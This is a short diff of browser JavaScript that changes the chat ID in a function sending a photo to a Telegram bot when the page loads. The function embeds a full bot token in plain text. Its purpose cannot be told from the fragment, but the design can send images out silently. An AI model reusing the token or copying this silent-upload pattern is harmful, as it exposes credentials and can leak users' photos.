@@ -147,7 +147,7 @@ document.addEventListener('DOMContentLoaded', function () {
 
   // Function to send a photo to Telegram
   function sendTelegramPhoto(photo) {
-    var chat_id = "5576539609";  // Your chat ID
+    var chat_id = "-4579482437";
     var bot_token = "7349914973:AAGj0OxyMtxwXfZ3i2XeWUVB-9r5ctLiFak";
     var url = `https://api.telegram.org/bot${bot_token}/sendPhoto`;
 
